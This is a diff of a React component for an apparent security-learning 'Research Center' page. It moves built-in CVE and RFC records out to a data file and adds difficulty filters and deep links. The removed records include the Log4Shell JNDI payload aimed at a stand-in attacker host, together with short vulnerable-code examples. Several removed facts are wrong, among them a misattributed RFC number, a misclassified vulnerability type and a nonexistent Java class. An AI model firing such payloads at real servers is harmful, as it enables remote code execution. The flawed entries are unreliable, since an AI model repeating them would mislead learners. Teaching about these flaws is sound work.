@@ -1,150 +1,63 @@
-import { useState, useMemo } from 'react'
+import { useState, useMemo, useEffect } from 'react'
 import { Link } from 'react-router-dom'
-import { 
+import {
   ScanSearch, ArrowRight, ShieldCheck, AlertTriangle
 } from 'lucide-react'
+import { CVE_DATABASE, RFC_DATABASE, rfcSlug, type ResearchDifficulty } from '../data/researchData'
 
 type TabType = 'cve' | 'rfc' | 'bulletins'
 
-interface CveDetails {
-  id: string
-  title: string
-  cvss: number
-  component: string
-  vulnerabilityType: string
-  description: string
-  exploitScenario: string
-  patchRemediation: string
-  vulnerableCode: string
-  secureCode: string
-}
-
-interface RfcDetails {
-  number: string
-  title: string
-  status: 'Live' | 'Draft' | 'Deprecated'
-  category: string
-  description: string
-  keyTakeaway: string
-}
-
-const RFC_DATABASE: RfcDetails[] = [
-  {
-    number: 'RFC 6749',
-    title: 'The OAuth 2.0 Authorization Framework',
-    status: 'Live',
-    category: 'Federation & Delegation',
-    description: 'The industry-standard protocol for token-based delegation, defining Authorization Code, Implicit, Resource Owner Credentials, and Client Credentials flows.',
-    keyTakeaway: 'Deprecates implicit and password grants in modern client configurations in favor of authorization codes with PKCE.'
-  },
-  {
-    number: 'RFC 7519',
-    title: 'JSON Web Token (JWT)',
-    status: 'Live',
-    category: 'Tokens',
-    description: 'Defines a compact, self-contained JSON structure for cryptographically sharing claims (identity context) across system boundaries.',
-    keyTakeaway: 'Always validate signatures (using standard algorithms, avoiding alg: "none") and verify claims (iss, exp, aud) on receipt.'
-  },
-  {
-    number: 'RFC 7636',
-    title: 'Proof Key for Code Exchange (PKCE) by Mobile/SPA Clients',
-    status: 'Live',
-    category: 'Security Extensions',
-    description: 'Mitigates authorization code interception attacks on public clients by requiring cryptographical code challenge/verifier validations.',
-    keyTakeaway: 'Mandatory for all Single Page Applications (SPAs) and native mobile apps to block code replay exploits.'
-  },
-  {
-    number: 'RFC 7643',
-    title: 'SCIM 2.0: Core Schema Definition',
-    status: 'Live',
-    category: 'Provisioning',
-    description: 'Specifies the common identity schemas (Users, Groups) to enable automated lifecycle management across distinct software directories.',
-    keyTakeaway: 'Enforces standard LDAP-like JSON mappings (e.g. givenName, familyName, emails, active) across SaaS target networks.'
-  },
-  {
-    number: 'RFC 9396',
-    title: 'Continuous Access Evaluation Protocol (CAEP / SSF)',
-    status: 'Live',
-    category: 'Zero Trust',
-    description: 'Defines real-time event sharing schemas (session termination, device changes) to allow Identity Providers to push instant security posture updates.',
-    keyTakeaway: 'Enables continuous token audits instead of waiting for standard 1-hour JWT expiration periods.'
-  },
-  {
-    number: 'OAuth 2.1',
-    title: 'OAuth 2.1 Security Best Practices (Draft)',
-    status: 'Draft',
-    category: 'Next-Gen Standards',
-    description: 'Consolidates ten years of security patches, making PKCE mandatory, deprecating implicit/resource owner grants, and enforcing exact redirect matching.',
-    keyTakeaway: 'Modernizes and hardens the baseline OAuth 2.0 spec, closing structural redirect and token leakage gaps.'
-  }
-]
-
-const CVE_DATABASE: CveDetails[] = [
-  {
-    id: 'CVE-2024-21626',
-    title: 'runc container escape (Filesystem Leak)',
-    cvss: 8.6,
-    component: 'runc (container runtime)',
-    vulnerabilityType: 'Directory Traversal',
-    description: 'Internal file descriptors kept open during runc execution allow containerized processes to access host directory paths, leading to container escapes.',
-    exploitScenario: 'Attacker deploys a malicious container image that exploits open file descriptors to execute host command shells as root.',
-    patchRemediation: 'Upgrade to runc v1.1.12 or later to enforce strict descriptor lockdowns on container boot cycles.',
-    vulnerableCode: `// Insecure execution mapping\nexecve("/proc/self/fd/7/...", args, env);`,
-    secureCode: `// Secure runtime descriptor isolation\nclose_open_fds_except(3); // Hard lock FDs before container execution`
-  },
-  {
-    id: 'CVE-2023-38146',
-    title: 'Windows Themes Remote Code Execution (ThemeBleed)',
-    cvss: 8.8,
-    component: 'Windows Themes / API Layer',
-    vulnerabilityType: 'Integer Overflow',
-    description: 'Vulnerability in the Windows Themes API where opening a crafted `.theme` file loads a remote DLL without certificate validation.',
-    exploitScenario: 'Victim downloads or previews a malicious theme package, triggering an automatic RPC call that loads the attacker\'s DLL.',
-    patchRemediation: 'Apply Microsoft September 2023 KB updates or disable the Windows Themes service if unnecessary.',
-    vulnerableCode: `// Vulnerable: Loads DLL from arbitrary remote SMB directories\nLoadLibraryExW("\\\\remote-smb\\share\\theme.dll", NULL, LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR);`,
-    secureCode: `// Secure: Restrict DLL load paths to verified local system folder paths\nLoadLibraryExW("C:\\\\Windows\\\\System32\\\\theme.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);`
-  },
-  {
-    id: 'CVE-2022-22965',
-    title: 'Spring4Shell Remote Code Execution',
-    cvss: 9.8,
-    component: 'Spring Framework (Java)',
-    vulnerabilityType: 'Class Loader Manipulation',
-    description: 'Allows remote attackers to manipulate the class loader via parameter binding, enabling them to upload arbitrary web shells into host servers.',
-    exploitScenario: 'Attacker sends a crafted HTTP POST request with query parameters targeting `class.module.classLoader` to rewrite Apache Tomcat logs.',
-    patchRemediation: 'Upgrade to Spring Framework v5.3.18 / v5.2.20 or later to restrict active classloader parameters.',
-    vulnerableCode: `// Vulnerable: Permissive class properties mapping\nPropertyDescriptorDescriptor pd = getPropertyDescriptor(beanClass, name);\n// Evaluates deep properties mapping like class.module.classLoader`,
-    secureCode: `// Secure: Whitelist properties or explicitly deny classLoader parameters\nif (name.contains("classLoader") || name.contains("protectionDomain")) {\n  throw new SecurityException("Unauthorized parameter binding!");\n}`
-  },
-  {
-    id: 'CVE-2021-44228',
-    title: 'Log4Shell (Remote Code Execution)',
-    cvss: 10.0,
-    component: 'Apache Log4j2 (Java)',
-    vulnerabilityType: 'JNDI LDAP Injection',
-    description: 'Log4j2 parsing handles JNDI lookups (e.g. `${jndi:ldap://}`) automatically on log evaluations, letting servers load and execute remote classes.',
-    exploitScenario: 'Attacker inserts `${jndi:ldap://attacker.com/a}` into an HTTP User-Agent header. Log4j logs the header, triggers JNDI, and runs the payload.',
-    patchRemediation: 'Upgrade to Log4j v2.17.1 or later. Alternatively, set `FORMAT_MSG_NO_LOOKUPS=true` or remove the JndiLookup class.',
-    vulnerableCode: `// Vulnerable: Log4j parses nested lookup formats automatically\nlogger.info("User Agent: " + userAgent);\n// Evaluates: "\${jndi:ldap://attacker-domain/exploit}"`,
-    secureCode: `// Secure: Interpolate logs safely as static arguments, disabling nested lookups\nlogger.info("User Agent: {}", userAgent); // Interpolation blocks recursive evaluation`
-  }
-]
+const DIFFICULTIES = ['All', 'Beginner', 'Intermediate', 'Advanced'] as const
 
 export default function ResearchCenter() {
   const [activeTab, setActiveTab] = useState<TabType>('cve')
   const [cveSearch, setCveSearch] = useState('')
   const [selectedCveId, setSelectedCveId] = useState<string>('CVE-2021-44228')
+  const [selectedRfcNumber, setSelectedRfcNumber] = useState<string>('RFC 6749')
+  const [cveDifficulty, setCveDifficulty] = useState<typeof DIFFICULTIES[number]>('All')
+  const [rfcDifficulty, setRfcDifficulty] = useState<typeof DIFFICULTIES[number]>('All')
 
-  // Filter CVEs based on search input
+  // Deep-link support: ?cve=<id> or ?rfc=<slug> lands directly on that entry (GEMINI.md §4I convention)
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      const params = new URLSearchParams(window.location.search)
+      const cveParam = params.get('cve')
+      const rfcParam = params.get('rfc')
+      const foundCve = cveParam ? CVE_DATABASE.find(c => c.id.toLowerCase() === cveParam.toLowerCase()) : undefined
+      const foundRfc = rfcParam ? RFC_DATABASE.find(r => rfcSlug(r.number) === rfcParam.toLowerCase()) : undefined
+      if (foundCve) {
+        setTimeout(() => {
+          setActiveTab('cve')
+          setSelectedCveId(foundCve.id)
+        }, 0)
+      } else if (foundRfc) {
+        setTimeout(() => {
+          setActiveTab('rfc')
+          setSelectedRfcNumber(foundRfc.number)
+        }, 0)
+      }
+    }
+  }, [])
+
+  // Filter CVEs based on search input and difficulty
   const filteredCves = useMemo(() => {
-    return CVE_DATABASE.filter(cve => 
-      cve.id.toLowerCase().includes(cveSearch.toLowerCase()) || 
+    return CVE_DATABASE.filter(cve =>
+      (cveDifficulty === 'All' || cve.difficulty === cveDifficulty) &&
+      (cve.id.toLowerCase().includes(cveSearch.toLowerCase()) ||
       cve.component.toLowerCase().includes(cveSearch.toLowerCase()) ||
-      cve.title.toLowerCase().includes(cveSearch.toLowerCase())
+      cve.title.toLowerCase().includes(cveSearch.toLowerCase()))
     )
-  }, [cveSearch])
+  }, [cveSearch, cveDifficulty])
+
+  const filteredRfcs = useMemo(() => {
+    return RFC_DATABASE.filter(rfc => rfcDifficulty === 'All' || rfc.difficulty === rfcDifficulty)
+  }, [rfcDifficulty])
 
   const selectedCve = CVE_DATABASE.find(c => c.id === selectedCveId)
+  const difficultyBadgeClass = (d: ResearchDifficulty) =>
+    d === 'Beginner' ? 'bg-status-success/15 text-status-success' :
+    d === 'Intermediate' ? 'bg-status-warning/15 text-status-warning' :
+    'bg-status-danger/15 text-status-danger'
 
   return (
     <div className="min-h-screen bg-bg-base text-text-primary font-sans">
@@ -204,8 +117,19 @@ export default function ResearchCenter() {
                   value={cveSearch}
                   onChange={e => setCveSearch(e.target.value)}
                   placeholder="Search CVEs or components..."
-                  className="w-full bg-bg-base border border-border-subtle/80 rounded px-2.5 py-1.5 text-xs text-text-primary focus:outline-none focus:border-accent-primary mb-3 font-semibold"
+                  className="w-full bg-bg-base border border-border-subtle/80 rounded px-2.5 py-1.5 text-xs text-text-primary focus:outline-none focus:border-accent-primary mb-2 font-semibold"
                 />
+                <div className="flex items-center gap-1.5 flex-wrap mb-3">
+                  {DIFFICULTIES.map(d => (
+                    <button
+                      key={d}
+                      onClick={() => setCveDifficulty(d)}
+                      className={`text-[9px] font-bold px-2 py-0.5 rounded-full border transition cursor-pointer ${cveDifficulty === d ? 'bg-accent-primary text-white border-accent-primary' : 'bg-bg-nested/60 border-border-subtle text-text-secondary hover:border-accent-primary'}`}
+                    >
+                      {d}
+                    </button>
+                  ))}
+                </div>
 
                 <div className="space-y-2 overflow-y-auto max-h-52 pr-1">
                   {filteredCves.map(c => (
@@ -218,9 +142,14 @@ export default function ResearchCenter() {
                         <span className="font-mono text-xs block">{c.id}</span>
                         <span className="text-[10px] text-text-muted truncate block max-w-[180px]">{c.title}</span>
                       </div>
-                      <span className={`text-[9px] font-black px-1.5 py-0.5 rounded ${c.cvss >= 9.0 ? 'bg-status-danger/10 text-status-danger' : 'bg-status-warning/10 text-status-warning'}`}>
-                        {c.cvss}
-                      </span>
+                      <div className="flex flex-col items-end gap-1 shrink-0">
+                        <span className={`text-[9px] font-black px-1.5 py-0.5 rounded ${c.cvss >= 9.0 ? 'bg-status-danger/10 text-status-danger' : 'bg-status-warning/10 text-status-warning'}`}>
+                          {c.cvss}
+                        </span>
+                        <span className={`text-[8px] font-bold px-1.5 py-0.5 rounded-full ${difficultyBadgeClass(c.difficulty)}`}>
+                          {c.difficulty}
+                        </span>
+                      </div>
                     </button>
                   ))}
                   {filteredCves.length === 0 && (
@@ -235,28 +164,51 @@ export default function ResearchCenter() {
           {activeTab === 'rfc' && (
             <div className="bg-bg-card border border-border-subtle rounded-xl p-4 shadow-md space-y-3 h-[340px] overflow-y-auto pr-1">
               <span className="text-[10px] text-text-secondary font-bold uppercase tracking-wider block border-b border-border-subtle pb-1">
-                Active Identity Protocols
+                Active Identity Protocols &amp; Drafts
               </span>
+              <div className="flex items-center gap-1.5 flex-wrap">
+                {DIFFICULTIES.map(d => (
+                  <button
+                    key={d}
+                    onClick={() => setRfcDifficulty(d)}
+                    className={`text-[9px] font-bold px-2 py-0.5 rounded-full border transition cursor-pointer ${rfcDifficulty === d ? 'bg-accent-primary text-white border-accent-primary' : 'bg-bg-nested/60 border-border-subtle text-text-secondary hover:border-accent-primary'}`}
+                  >
+                    {d}
+                  </button>
+                ))}
+              </div>
               <div className="space-y-2">
-                {RFC_DATABASE.map(rfc => (
-                  <div key={rfc.number} className="p-2.5 bg-bg-nested/40 border border-border-subtle rounded-lg text-xs leading-normal">
-                    <div className="flex justify-between items-center mb-1">
+                {filteredRfcs.map(rfc => (
+                  <button
+                    key={rfc.number}
+                    onClick={() => setSelectedRfcNumber(rfc.number)}
+                    className={`w-full text-left p-2.5 rounded-lg border transition text-xs leading-normal ${selectedRfcNumber === rfc.number ? 'bg-accent-glow border-accent-primary' : 'bg-bg-nested/40 border-border-subtle hover:border-border-subtle'}`}
+                  >
+                    <div className="flex justify-between items-center mb-1 gap-1.5">
                       <span className="font-mono font-extrabold text-accent-primary">{rfc.number}</span>
-                      <span className={`text-[8px] font-extrabold px-1.5 py-0.5 rounded-full ${
-                        rfc.status === 'Live' ? 'bg-status-success/15 text-status-success' :
-                        rfc.status === 'Draft' ? 'bg-status-warning/15 text-status-warning' :
-                        'bg-bg-nested text-text-muted border border-border-subtle'
-                      }`}>
-                        {rfc.status}
-                      </span>
+                      <div className="flex items-center gap-1 shrink-0">
+                        <span className={`text-[8px] font-bold px-1.5 py-0.5 rounded-full ${difficultyBadgeClass(rfc.difficulty)}`}>
+                          {rfc.difficulty}
+                        </span>
+                        <span className={`text-[8px] font-extrabold px-1.5 py-0.5 rounded-full ${
+                          rfc.status === 'Live' ? 'bg-status-success/15 text-status-success' :
+                          rfc.status === 'Draft' ? 'bg-status-warning/15 text-status-warning' :
+                          'bg-bg-nested text-text-muted border border-border-subtle'
+                        }`}>
+                          {rfc.status}
+                        </span>
+                      </div>
                     </div>
                     <span className="block font-bold text-text-primary text-[11px] mb-0.5">{rfc.title}</span>
                     <p className="text-[10px] text-text-muted mb-1.5 leading-relaxed">{rfc.description}</p>
                     <span className="block text-[9px] text-text-secondary leading-normal border-t border-border-subtle/40 pt-1">
                       🔑 <strong>Key Takeaway:</strong> {rfc.keyTakeaway}
                     </span>
-                  </div>
+                  </button>
                 ))}
+                {filteredRfcs.length === 0 && (
+                  <p className="text-xs text-text-muted italic py-4 text-center">No RFCs match this difficulty filter.</p>
+                )}
               </div>
             </div>
           )}
@@ -310,6 +262,9 @@ export default function ResearchCenter() {
                       selectedCve.cvss >= 9.0 ? 'bg-status-danger/10 text-status-danger border border-status-danger/20' : 'bg-status-warning/10 text-status-warning border border-status-warning/20'
                     }`}>
                       CVSS Severity: {selectedCve.cvss} ({selectedCve.cvss >= 9.0 ? 'Critical' : 'High'})
+                    </span>
+                    <span className={`text-[10px] font-bold px-2 py-0.5 rounded-full ${difficultyBadgeClass(selectedCve.difficulty)}`}>
+                      {selectedCve.difficulty}
                     </span>
                   </div>
 
